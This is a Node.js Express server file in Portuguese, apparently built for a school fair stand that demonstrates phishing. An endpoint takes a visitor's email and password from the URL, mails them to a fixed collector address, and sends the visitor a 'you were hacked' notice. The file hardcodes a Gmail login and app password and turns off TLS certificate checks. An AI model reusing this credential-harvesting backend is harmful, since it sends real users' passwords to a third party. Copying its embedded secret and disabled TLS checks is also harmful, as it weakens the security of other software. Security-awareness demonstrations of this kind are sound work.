import express from 'express'
const servidor = express() ;
import nodemailer from 'nodemailer'
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'


servidor.get('/send/:email/:senha', (req, resp) => {

   let Email= req.params.email
    let Senha= req.params.senha

const trasport = nodemailer.createTransport({

    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth:{
        user: 'hackingfeira@gmail.com',
        pass: 'vxbg dcbw doxm lxgu'

    },
    pool: true,
    rateLimit: 5,
    socketTimeout: 5000, 
});


trasport.sendMail({

    from: 'hackingfeira@email.com',
    to:`nivoltareli@gmail.com`,
    subject: 'Cadastro hackeado',
    html: `<!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Aviso Importante: Segurança de Conta</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f2f2f2;
                color: #ffffff;
                padding: 20px;
            }
            .container {
                background-color: #ffffff;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            .header {
                text-align: center;
                padding-bottom: 20px;
            }
            .header h1 {
                color: #5271ff;
            }
            .content {
                line-height: 1.6;
            }
            .content p {
                margin: 15px 0;
            }
            .btn {
                display: inline-block;
                background-color: #5271ff;
                color: #ffffff;
                padding: 10px 20px;
                text-decoration: none;
                border-radius: 5px;
                margin-top: 20px;
                text-align: center;
            }
            .imagem{
                
            width: 130px;
                
            }
            .btn:hover {
                background-color: #5271ff;
            }
                 .btn p {
                color: #ffffff;
            }
            .footer {
                margin-top: 30px;
                text-align: center;
                font-size: 12px;
                color: #777;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                    <img class= "imagem" src="https://s4.aconvert.com/convert/p3r68-cdx67/amb0i-6xahr.png" alt="">
                <h1>Hackeado pelo FREI</h1>
            </div>
            <div class="content">
                <p>Boa,</p>
                 <p>Mais uma vitima hackeada.</p>
              
               
                   <p> <strong>Os dados dela são:</strong></p>
                
               
                
                <a class="btn"><strong>  Email:</strong>${Email}</a>
                <a class="btn"><strong>  Senha:</strong>${Senha}</a>
                <p></p>
                <p>Atenciosamente,<br>Equipe de hacking do FREI!</p>
            </div>
           
        </div>
    </body>
    </html>`
 })

trasport.sendMail({

from: 'hackingfeira@email.com',
to:`${Email}`,
subject: 'Cadastro hackeado',
html: `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviso Importante: Segurança de Conta</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            color: #ffffff;
            padding: 20px;
        }
        .container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
              .imagem{
                
            width: 130px;
                
            }
        .header {
            text-align: center;
            padding-bottom: 20px;
        }
        .header h1 {
            color: #5271ff;
        }
        .content {
            line-height: 1.6;
        }
        .content p {
            margin: 15px 0;
        }
        .btn {
            display: inline-block;
            background-color: #5271ff;
            color: #ffffff;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 20px;
            text-align: center;
        }
       
        
        .btn:hover {
            background-color: #5271ff;
        }
             .btn p {
            color: #ffffff;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
         <img class= "imagem" src="https://s4.aconvert.com/convert/p3r68-cdx67/amb0i-6xahr.png" alt="">
            <h1>Hackeado pelo FREI</h1>
        </div>
        <div class="content">
            <p>Olá,</p>
          <p>Infelizmente você foi hackeado pelo software do instituto nossa senhora de fátima.</p>
            <p>Para proteger sua segurança, recomendamos que você preste atenção por onde você anda logando!</p>
           
               <p> <strong>Obrigado por participar do nosso stand, volte sempre!</strong></p>
            
           
            <p>Seus dados são:</p>
            <a class="btn"><strong>  Email:</strong>${Email}</a>
            <a class="btn"><strong>  Senha:</strong>${Senha}</a>
            <p></p>
            <p>Atenciosamente,<br>Equipe de hacking do FREI!</p>
        </div>
       
    </div>
</body>
</html>`



})


.then(()=> resp.send('email enviado com sucesso') )
.catch((err)=> resp.send('erro ao enviar email', err))
})

servidor.listen(3030, () => console.log("api subiu na porta tal"))

